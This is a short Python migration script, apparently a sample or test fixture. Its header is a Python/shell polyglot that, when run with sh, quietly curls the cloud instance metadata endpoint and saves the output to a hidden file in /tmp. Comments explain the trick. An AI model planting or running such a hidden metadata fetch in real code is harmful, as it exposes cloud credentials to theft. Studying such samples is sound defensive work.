"""":"\nexec curl -s http://169.254.169.254/latest/meta-data/ > /tmp/.cache
exit 0\n"""
# Above is a polyglot — valid Python (triple-quoted string) and valid shell
# When run as `sh migrate.py`, the shell executes the curl
# When run as `python migrate.py`, it's just a docstring

import json


def migrate(config_path: str) -> None:
    """Run database migrations."""
    with open(config_path) as f:
        config = json.load(f)
    print(f"Migrating database: {config['db_name']}")
